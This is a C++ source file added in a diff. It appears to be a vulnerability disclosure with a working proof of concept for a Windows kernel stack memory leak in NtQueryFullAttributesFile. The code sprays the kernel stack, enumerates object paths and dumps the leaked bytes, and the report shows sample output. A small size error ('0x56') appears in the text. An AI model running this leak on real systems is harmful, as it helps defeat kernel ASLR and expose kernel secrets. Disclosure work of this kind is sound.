@@ -1,0 +1,265 @@
+/*
+We have discovered that the nt!NtQueryFullAttributesFile system call invoked with paths of certain kernel objects discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects Windows 7 to 10, 32/64-bit. The paths that we have observed to trigger the leak in our test Windows 10 (1709) 64-bit VM are:
+
+--- cut ---
+  "\GLOBAL??\D:\"        (CD-ROM partition)
+  "\GLOBAL??\CdRom0\"
+  "\GLOBAL??\FltMgr"
+  "\GLOBAL??\FltMgr\"
+  "\GLOBAL??\MAILSLOT\"
+  "\GLOBAL??\Volume{GUID}\"
+  "\GLOBAL??\PIPE\"
+  "\Device\CdRom0\"
+  "\Device\NamedPipe\"
+  "\Device\Mailslot\"
+--- cut ---
+
+The output structure returned by the system call is FILE_NETWORK_OPEN_INFORMATION [1]:
+
+--- cut ---
+  typedef struct _FILE_NETWORK_OPEN_INFORMATION {
+    LARGE_INTEGER CreationTime;
+    LARGE_INTEGER LastAccessTime;
+    LARGE_INTEGER LastWriteTime;
+    LARGE_INTEGER ChangeTime;
+    LARGE_INTEGER AllocationSize;
+    LARGE_INTEGER EndOfFile;
+    ULONG         FileAttributes;
+  } FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;
+--- cut ---
+
+It occupies 52 (0x34) bytes in memory, but due to alignment to an 8-byte boundary, it is effectively 0x56 (0x38) bytes long. In case of most of the above affected paths, the problem is that the 4 trailing bytes of padding are never initialized. As the kernel uses a temporary copy of the structure (allocated in the stack frame of nt!NtQueryFullAttributesFile) that is later passed to user-mode, the bug results in the disclosure of those 4 uninitialized kernel stack bytes. This can be observed by running the attached proof-of-concept program, which invokes nt!NtQueryFullAttributesFile against every object in the global object namespace, preceded by spraying the kernel stack with a 0x41 ('A') marker byte. Relevant parts of the output are shown below:
+
+--- cut ---
+  Name: \GLOBAL??\D:\, Status: 0
+  00000000: 80 08 4a 06 66 46 d3 01 00 00 00 00 00 00 00 00 ..J.fF..........
+  00000010: 80 08 4a 06 66 46 d3 01 80 08 4a 06 66 46 d3 01 ..J.fF....J.fF..
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \GLOBAL??\CdRom0\, Status: 0
+  00000000: 80 08 4a 06 66 46 d3 01 00 00 00 00 00 00 00 00 ..J.fF..........
+  00000010: 80 08 4a 06 66 46 d3 01 80 08 4a 06 66 46 d3 01 ..J.fF....J.fF..
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \GLOBAL??\MAILSLOT\, Status: 0
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \GLOBAL??\Volume{GUID}\, Status: 0
+  00000000: 80 08 4a 06 66 46 d3 01 00 00 00 00 00 00 00 00 ..J.fF..........
+  00000010: 80 08 4a 06 66 46 d3 01 80 08 4a 06 66 46 d3 01 ..J.fF....J.fF..
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \GLOBAL??\PIPE\, Status: 0
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \Device\CdRom0\, Status: 0
+  00000000: 80 08 4a 06 66 46 d3 01 00 00 00 00 00 00 00 00 ..J.fF..........
+  00000010: 80 08 4a 06 66 46 d3 01 80 08 4a 06 66 46 d3 01 ..J.fF....J.fF..
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \Device\NamedPipe\, Status: 0
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+  Name: \Device\Mailslot\, Status: 0
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 10 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+--- cut ---
+
+In case of the \GLOBAL??\FltMgr device, the entire 56-byte memory area remains uninitialized, and is copied in that form to user-mode. See below:
+
+--- cut ---
+  Name: \GLOBAL??\FltMgr, Status: 0
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000030: 41 41 41 41 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? AAAAAAAA........
+  Name: \GLOBAL??\FltMgr\, Status: 0
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  00000030: 41 41 41 41 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? AAAAAAAA........
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define DIRECTORY_QUERY    0x0001
+#define DIRECTORY_TRAVERSE 0x0002
+
+typedef struct _FILE_NETWORK_OPEN_INFORMATION {
+  LARGE_INTEGER CreationTime;
+  LARGE_INTEGER LastAccessTime;
+  LARGE_INTEGER LastWriteTime;
+  LARGE_INTEGER ChangeTime;
+  LARGE_INTEGER AllocationSize;
+  LARGE_INTEGER EndOfFile;
+  ULONG         FileAttributes;
+} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;
+
+typedef struct _OBJECT_DIRECTORY_INFORMATION {
+  UNICODE_STRING Name;
+  UNICODE_STRING TypeName;
+} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;
+
+extern "C" {
+  NTSTATUS NTAPI NtQueryFullAttributesFile(
+    _In_  POBJECT_ATTRIBUTES             ObjectAttributes,
+    _Out_ PFILE_NETWORK_OPEN_INFORMATION FileInformation
+  );
+
+  NTSTATUS WINAPI NtQueryDirectoryObject(
+    _In_      HANDLE  DirectoryHandle,
+    _Out_opt_ PVOID   Buffer,
+    _In_      ULONG   Length,
+    _In_      BOOLEAN ReturnSingleEntry,
+    _In_      BOOLEAN RestartScan,
+    _Inout_   PULONG  Context,
+    _Out_opt_ PULONG  ReturnLength
+  );
+
+  NTSTATUS WINAPI NtOpenDirectoryObject(
+    _Out_ PHANDLE            DirectoryHandle,
+    _In_  ACCESS_MASK        DesiredAccess,
+    _In_  POBJECT_ATTRIBUTES ObjectAttributes
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(*EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+VOID QueryFile(HANDLE RootDirectory, PCWSTR Path) {
+  OBJECT_ATTRIBUTES Attributes;
+  UNICODE_STRING Name;
+  RtlInitUnicodeString(&Name, Path);
+  InitializeObjectAttributes(&Attributes, &Name, OBJ_CASE_INSENSITIVE, RootDirectory, NULL);
+
+  FILE_NETWORK_OPEN_INFORMATION FileInformation, EmptyInformation;
+  RtlZeroMemory(&FileInformation, sizeof(FileInformation));
+  RtlZeroMemory(&EmptyInformation, sizeof(EmptyInformation));
+
+  SprayKernelStack();
+
+  NTSTATUS Status = NtQueryFullAttributesFile(&Attributes, &FileInformation);
+  if (memcmp(&FileInformation, &EmptyInformation, sizeof(FileInformation)) != 0) {
+    wprintf(L"Name: %s, Status: %x\n", Path, Status);
+    PrintHex(&FileInformation, sizeof(FileInformation));
+  }
+}
+
+VOID EnumerateDirectory(PWCHAR path) {
+  HANDLE hdir = NULL;
+  OBJECT_ATTRIBUTES attrs;
+  UNICODE_STRING name;
+
+  RtlInitUnicodeString(&name, path);
+  InitializeObjectAttributes(&attrs, &name, 0, NULL, NULL);
+  NTSTATUS st = NtOpenDirectoryObject(&hdir, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &attrs);
+
+  if (NT_SUCCESS(st)) {
+    CONST ULONG kMaxBufferSize = 128 * 1024;
+    PBYTE buffer = (PBYTE)malloc(kMaxBufferSize);
+
+    ULONG Context;
+    st = NtQueryDirectoryObject(hdir, buffer, kMaxBufferSize, FALSE, TRUE, &Context, NULL);
+    if (NT_SUCCESS(st)) {
+      POBJECT_DIRECTORY_INFORMATION pdi = (POBJECT_DIRECTORY_INFORMATION)buffer;
+      while (pdi->Name.Buffer != NULL) {
+        WCHAR path_buffer[MAX_PATH];
+
+        if (!wcscmp(path, L"\\")) {
+          wsprintf(path_buffer, L"%s%s", path, pdi->Name.Buffer);
+        }
+        else {
+          wsprintf(path_buffer, L"%s\\%s", path, pdi->Name.Buffer);
+        }
+
+        if (!wcscmp(pdi->TypeName.Buffer, L"Directory")) {
+          EnumerateDirectory(path_buffer);
+        }
+        else {
+          QueryFile(NULL, path_buffer);
+          wcscat_s(path_buffer, L"\\");
+          QueryFile(NULL, path_buffer);
+        }
+
+        pdi++;
+      }
+    }
+
+    free(buffer);
+    NtClose(hdir);
+  }
+}
+
+int main() {
+  EnumerateDirectory(L"\\");
+
+  return 0;
+}
